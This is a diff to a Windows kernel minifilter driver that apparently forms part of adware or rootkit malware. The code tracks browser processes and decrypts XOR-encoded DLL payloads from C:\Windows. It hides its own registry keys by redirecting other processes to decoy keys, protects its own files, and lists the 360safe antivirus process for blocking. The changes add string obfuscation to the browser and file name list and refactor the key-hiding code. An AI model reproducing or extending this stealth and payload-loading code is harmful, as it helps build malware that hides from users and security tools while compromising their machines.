@@ -20,6 +20,7 @@
 #ifndef CXX_ADSYS_H
 #include <fltKernel.h>
 #include "adsys.h"
+#include "str.h"
 #endif
 
 //#include "struct.h"
@@ -63,6 +64,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     UNICODE_STRING  ustrLinkName;
     UNICODE_STRING  ustrDevName;
     PDEVICE_OBJECT  pDevObj;
+	WCHAR pBrowser[][20]={L"",L"",L"",L"",L"",L"",L"",L"",L"",L"",L"",L"",L"",L"",L"",L""};
     int i = 0;
     ReadDriverParameters(pRegistryString);
     pDriverObj->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
@@ -107,64 +109,68 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
         IoDeleteDevice(pDevObj);
         return status;
     }
-    IoRegisterShutdownNotification(pDevObj);
-	g_drobj=pDriverObj;
+    //IoRegisterShutdownNotification(pDevObj);
+    //g_drobj=pDriverObj;
     //
     //  TODO: Add initialization code here.
     //
 //浏览器
+	MyDecryptFile(strbrowser,sizeof(strbrowser),0xb);
+	memcpy(pBrowser,strbrowser,sizeof(strbrowser));
+
 
     InitializeListHead(&g_ListProcess);
-    AppendListNode(L"360se.exe",&g_ListProcess,0);
-    AppendListNode(L"chrome.exe",&g_ListProcess,0);
-    AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
-    AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
-    AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
-    AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
-    AppendListNode(L"firefox.exe",&g_ListProcess,0);
-    AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
-    AppendListNode(L"liebao.exe",&g_ListProcess,0);
-    AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
-    AppendListNode(L"iexplore.exe",&g_ListProcess,0);
-    AppendListNode(L"360chrome.exe",&g_ListProcess,0);
-    AppendListNode(L"opera.exe",&g_ListProcess,0);
-    AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
+	for(i=0;i<14;i++){
+		 AppendListNode(pBrowser[i],&g_ListProcess,0);
+	}
+	
+    //AppendListNode(L"360se.exe",&g_ListProcess,0);
+    //AppendListNode(L"chrome.exe",&g_ListProcess,0);
+    //AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
+    //AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
+    //AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
+    //AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
+    //AppendListNode(L"firefox.exe",&g_ListProcess,0);
+    //AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
+    //AppendListNode(L"liebao.exe",&g_ListProcess,0);
+    //AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
+    //AppendListNode(L"iexplore.exe",&g_ListProcess,0);
+    //AppendListNode(L"360chrome.exe",&g_ListProcess,0);
+    //AppendListNode(L"opera.exe",&g_ListProcess,0);
+    //AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
 
 //要保护的文件
     InitializeListHead(&g_ProtectFile);
     KeInitializeSpinLock(&g_spin_lockfile);
-
-    AppendListNode(L"adplug.dll",&g_ProtectFile,2);
-    AppendListNode(L"adsys.sys",&g_ProtectFile,1);
-
-
+    AppendListNode(pBrowser[14],&g_ProtectFile,2);
+    AppendListNode(pBrowser[15],&g_ProtectFile,1);
 //不让访问的进程名
-    InitializeListHead(&g_AntiProcess);
-    KeInitializeSpinLock(&g_spin_process);
-    AppendListNode(L"360safe.exe",&g_AntiProcess,0);
+    //InitializeListHead(&g_AntiProcess);
+    //KeInitializeSpinLock(&g_spin_process);
+    //AppendListNode(L"360safe.exe",&g_AntiProcess,0);
 
-    //kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
-    status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
+    ////kprintf("file is exist:%d",CheckElementExistsViaOpen(g_pPlugPath));
+    //status = MzReadFile(g_pPlugPath,&g_pPlugBuffer,&g_iPlugSize);
 
 
 #ifdef _AMD64_
     //x64 add code
     status = MzReadFile(L"\\??\\C:\\Windows\\adcore64.dat",&g_pDll64,&g_iDll64);
     if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll64,g_iDll64);
+        MyDecryptFile(g_pDll64,g_iDll64,16);
 
     }
 
     status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
     if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll32,g_iDll32);
+        MyDecryptFile(g_pDll32,g_iDll32,16);
     }
 
 #else
     //x86 add code
     status = MzReadFile(L"\\??\\C:\\Windows\\adcore32.dat",&g_pDll32,&g_iDll32);
     if (NT_SUCCESS(status)) {
-        MyDecryptFile(g_pDll32,g_iDll32);
+        MyDecryptFile(g_pDll32,g_iDll32,16);
     }
 #endif
 
@@ -176,7 +182,6 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
 #endif
 
     kprintf("[DriverEntry] KeServiceDescriptorTable:%p", KeServiceDescriptorTable);
-
     PsGetProcessWow64Process = (P_PsGetProcessWow64Process)GetSystemRoutineAddress(L"PsGetProcessWow64Process");
     PsGetProcessPeb = (P_PsGetProcessPeb)GetSystemRoutineAddress(L"PsGetProcessPeb");
     DbgPrint("[DriverEntry] PsGetProcessPeb:%p   PsGetProcessWow64Process:%p", PsGetProcessPeb, PsGetProcessWow64Process);
@@ -186,28 +191,28 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObj, IN PUNICODE_STRING pRegistryS
     }
 
 
-    // 映像加载回调
+    //// 映像加载回调
 
-    status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-    if(!NT_SUCCESS(status)) {
-        kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
-    }
+    //status = PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    //if(!NT_SUCCESS(status)) {
+    //    kprintf("[DriverEntry] PsSetLoadImageNotifyRoutine Failed! status:%x\n", status);
+    //}
 
-    ////注册表回调监控
-    SetRegisterCallback();
-    //文件回调监控
-    ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
-    status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
-    ASSERT( NT_SUCCESS( status ) );
-    if (NT_SUCCESS( status )) {
-        //
-        //  Start filtering i/o
-        //
-        status = FltStartFiltering( gFilterHandle);
-        if (!NT_SUCCESS( status )) {
-            FltUnregisterFilter( gFilterHandle);
-        }
-    }
+    //////注册表回调监控
+    //SetRegisterCallback();
+    ////文件回调监控
+    //ExInitializeNPagedLookasideList( &Pre2PostContextList,NULL,NULL,0,sizeof(PRE_2_POST_CONTEXT),PRE_2_POST_TAG,0 );
+    //status = FltRegisterFilter( pDriverObj,&FilterRegistration,&gFilterHandle);
+    //ASSERT( NT_SUCCESS( status ) );
+    //if (NT_SUCCESS( status )) {
+    //    //
+    //    //  Start filtering i/o
+    //    //
+    //    status = FltStartFiltering( gFilterHandle);
+    //    if (!NT_SUCCESS( status )) {
+    //        FltUnregisterFilter( gFilterHandle);
+    //    }
+    //}
     return STATUS_SUCCESS;
 }
 
@@ -221,8 +226,8 @@ VOID DriverUnload(IN PDRIVER_OBJECT pDriverObj)
     //
     // TODO: Add uninstall code here.
     //
-    PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
-    RemoveRegisterCallback();
+    //PsRemoveLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)ImageNotify);
+    //RemoveRegisterCallback();
     // Delete the symbolic link
     RtlInitUnicodeString(&strLink, SYMBOLIC_LINK_NAME);
     IoDeleteSymbolicLink(&strLink);
@@ -993,9 +998,7 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         DbgPrint("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
         ///pStreamCtx->aes_ctr_ctx = NULL ;
         SC_UNLOCK(pStreamCtx, OldIrql);
-
         //Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
-
     }
     finally{
         if (NULL != pfNameInfo) FltReleaseFileNameInformation(pfNameInfo);
@@ -1268,52 +1271,7 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //  exception.
         //
 
-
-        try {
-
-//          DbgPrint("[PostRead] SwappedBuffer:%s filelen:%d",p2pCtx->SwappedBuffer,Data->IoStatus.Information);
-
-
-
-            if (MmIsAddressValid(p2pCtx->SwappedBuffer)) {
-
-                //除去explorer 全加密
-                if(p2pCtx->pStreamCtx->uEncrypteType==1) {
-                    PUCHAR  puorigin=(PUCHAR)origBuf;
-                    ULONG i=0;
-//                    kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
-                    for(i=0; i<Data->IoStatus.Information; i++) {
-                        PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
-                        puorigin[i]=pByte[i]^0xa;
-                    }
-                } else if(p2pCtx->pStreamCtx->uEncrypteType==2) {
-                    WCHAR exename[512]= {0};
-                    BOOLEAN  bgetname=  GetProcessNameByObj(PsGetCurrentProcess(),exename);
-//                  kprintf("[PostRead] exename:%ws  bgetname:%d pid:%d",exename,bgetname,PsGetCurrentProcessId());
-                    if (_wcsicmp(exename,L"explorer.exe")==0||_wcsicmp(exename,L"rundll32.exe")==0) {
-                        RtlCopyMemory( origBuf,p2pCtx->SwappedBuffer, Data->IoStatus.Information );
-                    } else {
-                        PUCHAR  puorigin=(PUCHAR)origBuf;
-                        ULONG i=0;
-//                        kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
-                        for(i=0; i<Data->IoStatus.Information; i++) {
-                            PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
-                            puorigin[i]=pByte[i]^0xa;
-                        }
-                    }
-
-                }
-
-            }
-
-
-        }
-        __except(EXCEPTION_EXECUTE_HANDLER) {
-            ULONG code= GetExceptionCode();
-//            DbgPrint("GetExceptionCode code:%x",code);
-        }
-
-
+        EncodeBuffer(Data,p2pCtx,origBuf);
 
     }
     finally {
@@ -1379,7 +1337,7 @@ FLT_POSTOP_CALLBACK_STATUS PostReadWhenSafe (IN OUT PFLT_CALLBACK_DATA Data,IN P
             Data->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
             Data->IoStatus.Information = 0;
         } else {
-
+            EncodeBuffer(Data,p2pCtx,origBuf);
             //DbgPrint("[PostReadWhenSafe] %s",origBuf);
             //memset( p2pCtx->SwappedBuffer, 0x61, Data->IoStatus.Information);
             //RtlCopyMemory(origBuf, p2pCtx->SwappedBuffer, Data->IoStatus.Information);
@@ -1439,103 +1397,35 @@ NTSTATUS RegCallBack(PVOID CallbackContext,PVOID Argument1,PVOID Argument2)
                 if (GetNameByUnicodeString(pPath, key)) {
                     WCHAR exename[512]= {0};
                     UNICODE_STRING FullKeyName = { 0 };
-                    HANDLE                      KeyHandle;
-                    ULONG                       Disposition;
-                    OBJECT_ATTRIBUTES           ObjectAttrib;
-                    //0OverlayIcon
-                    if (_wcsicmp(key, L"adplug") == 0) {
-     
-						WCHAR *pslr = NULL;
-						BOOLEAN  bGetName=FALSE;
 
+                    if (_wcsicmp(key, L"adplug") == 0) {
+                        WCHAR *pslr = NULL;
+                        BOOLEAN  bGetName=FALSE;
                         status = LfGetObjectName( KeyInfo->RootObject, &RootKeyName );
                         if ( NT_SUCCESS(status) ) {
-                           // kprintf("RootKeyName:%wZ",RootKeyName);
-							_wcslwr(RootKeyName->Buffer, RootKeyName->Length);
+                            _wcslwr(RootKeyName->Buffer, RootKeyName->Length);
                             if (wcsstr(RootKeyName->Buffer, L"explorer\\shelliconoverlayidentifiers")) {
-                        		 kfree( RootKeyName );
-								goto LABEL1;
+                                kfree( RootKeyName );
+                                goto LABEL1;
                             }
                             kfree( RootKeyName );
                         }
-
-
-
-                      	 pslr = _wcslwr(pPath->Buffer, pPath->Length);
+                        pslr = _wcslwr(pPath->Buffer, pPath->Length);
                         if (wcsstr(pslr, L"shelliconoverlayidentifiers\\adplug")) {
 
-						
-LABEL1:
-							
-				   			bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
+                        LABEL1:
+                            bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
                             if (bGetName&&_wcsicmp(L"explorer.exe",exename)!=0) {
-
-                                RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files");
-                                InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-                                if (NotifyClass == RegNtPreCreateKeyEx) {
-                                    status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
-                                } else {
-                                    status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
-                                }
-                                if (NT_SUCCESS(status)) {
-                                    PVOID KeyObject;
-                                    status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
-                                    if (NT_SUCCESS(status)) {
-                                        __try {
-                                            if (NotifyClass == RegNtPreCreateKeyEx) {
-                                                *KeyInfo->Disposition   = Disposition;
-                                            }
-
-                                            *KeyInfo->ResultObject = KeyObject;
-                                            KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
-                                            status = STATUS_CALLBACK_BYPASS;
-                                        } __except(EXCEPTION_EXECUTE_HANDLER) {
-                                            ObDereferenceObject(KeyObject);
-                                            status =  GetExceptionCode();
-                                        }
-                                    }
-
-                                    ZwClose(KeyHandle);
-                                }
-
-
+                                RedirectReg(KeyInfo,NotifyClass,L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files");
                             }
-
                         }
-                        //pslr:\registry\machine\system\controlset001\services\adsys
                     } else if(_wcsicmp(key, L"adsys") == 0) {
                         WCHAR *pslr = _wcslwr(pPath->Buffer, pPath->Length);
                         if (wcsstr(pslr, L"services\\adsys")!=NULL) {
                             BOOLEAN   bGetName= GetProcessNameByObj(PsGetCurrentProcess(),exename);
-                            //exename:services.exe Path:\registry\machine\system\currentcontrolset\services\adsys
                             if (bGetName&&_wcsicmp(L"services.exe",exename)!=0) {
                                 //kprintf("exename:%ws Path:%wZ",exename,pPath);
-                                RtlInitUnicodeString(&FullKeyName, L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\services\\ACPI");//services\ACPI
-                                InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
-                                if (NotifyClass == RegNtPreCreateKeyEx) {
-                                    status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
-                                } else {
-                                    status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
-                                }
-                                if (NT_SUCCESS(status)) {
-                                    PVOID KeyObject;
-                                    status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
-                                    if (NT_SUCCESS(status)) {
-                                        __try {
-                                            if (NotifyClass == RegNtPreCreateKeyEx) {
-                                                *KeyInfo->Disposition   = Disposition;
-                                            }
-                                            *KeyInfo->ResultObject = KeyObject;
-                                            KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
-                                            status = STATUS_CALLBACK_BYPASS;
-                                        } __except(EXCEPTION_EXECUTE_HANDLER) {
-                                            ObDereferenceObject(KeyObject);
-                                            status =  GetExceptionCode();
-                                        }
-                                    }
-
-                                    ZwClose(KeyHandle);
-                                }
+                                RedirectReg(KeyInfo,NotifyClass,L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files" );
 
                             }
 
@@ -1863,7 +1753,7 @@ VOID ImageNotify(PUNICODE_STRING       FullImageName, HANDLE ProcessId, PIMAGE_I
         if (bGet&&_wcsicmp(exename,L"")!=NULL) {
             pCMDData= FindInList(exename,&g_ListProcess,&g_spin_browser);
             if (pCMDData) {
-               newWorkItem(32);
+                newWorkItem(32);
             }
 
         }
@@ -2148,13 +2038,13 @@ ULONG MzGetFileSize(HANDLE hfile)
     return fsi.EndOfFile.QuadPart;
 }
 
-void MyDecryptFile(PVOID pdata, int len)
+void MyDecryptFile(PUCHAR pdata, int len,UCHAR key )
 {
     int i = 0;
-    char* p1 = (char*)pdata;
+    PUCHAR p1 = (PUCHAR*)pdata;
 
     for(i = 0; i < len; i++) {
-        p1[i] = 16 ^ p1[i];
+        p1[i] = key ^ p1[i];
     }
 }
 
@@ -2441,6 +2331,79 @@ NTSTATUS LfGetObjectName( IN CONST PVOID Object, OUT PUNICODE_STRING* ObjectName
     return Status;
 }
 
+void EncodeBuffer(PFLT_CALLBACK_DATA Cbd,PPRE_2_POST_CONTEXT p2pCtx,PUCHAR origBuf)
+{
+    try {
+        if (MmIsAddressValid(p2pCtx->SwappedBuffer)) {
+            //除去explorer 全加密
+            if(p2pCtx->pStreamCtx->uEncrypteType==1) {
+                ULONG i=0;
+                //                    kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
+                for(i=0; i<Cbd->IoStatus.Information; i++) {
+                    PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
+                    origBuf[i]=pByte[i]^0xa;
+                }
+            } else if(p2pCtx->pStreamCtx->uEncrypteType==2) {
+                WCHAR exename[512]= {0};
+                BOOLEAN  bgetname=  GetProcessNameByObj(PsGetCurrentProcess(),exename);
+                //                  kprintf("[PostRead] exename:%ws  bgetname:%d pid:%d",exename,bgetname,PsGetCurrentProcessId());
+
+
+                if (_wcsicmp(exename,L"explorer.exe")==0||_wcsicmp(exename,L"rundll32.exe")==0) {
+                    RtlCopyMemory( origBuf,p2pCtx->SwappedBuffer, Cbd->IoStatus.Information );
+                } else {
+                    ULONG i=0;
+                    //                        kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
+                    for(i=0; i<Cbd->IoStatus.Information; i++) {
+                        PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
+                        origBuf[i]=pByte[i]^0xa;
+                    }
+                }
+            }
+        }
+    }
+    __except(EXCEPTION_EXECUTE_HANDLER) {
+        ULONG code= GetExceptionCode();
+    }
+
+}
+//L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files"
+NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo,long NotifyClass,WCHAR path[])
+{
+    NTSTATUS status = STATUS_SUCCESS;
+    UNICODE_STRING FullKeyName = { 0 };
+    HANDLE                      KeyHandle;
+    ULONG                       Disposition;
+    OBJECT_ATTRIBUTES           ObjectAttrib;
+    RtlInitUnicodeString(&FullKeyName, path);
+    InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    if (NotifyClass == RegNtPreCreateKeyEx) {
+        status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
+    } else {
+        status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
+    }
+    if (NT_SUCCESS(status)) {
+        PVOID KeyObject;
+        status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
+        if (NT_SUCCESS(status)) {
+            __try {
+                if (NotifyClass == RegNtPreCreateKeyEx) {
+                    *KeyInfo->Disposition   = Disposition;
+                }
+
+                *KeyInfo->ResultObject = KeyObject;
+                KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
+                status = STATUS_CALLBACK_BYPASS;
+            } __except(EXCEPTION_EXECUTE_HANDLER) {
+                ObDereferenceObject(KeyObject);
+                status =  GetExceptionCode();
+            }
+        }
+
+        ZwClose(KeyHandle);
+    }
+	return status;
+}
 
 /* EOF */
 
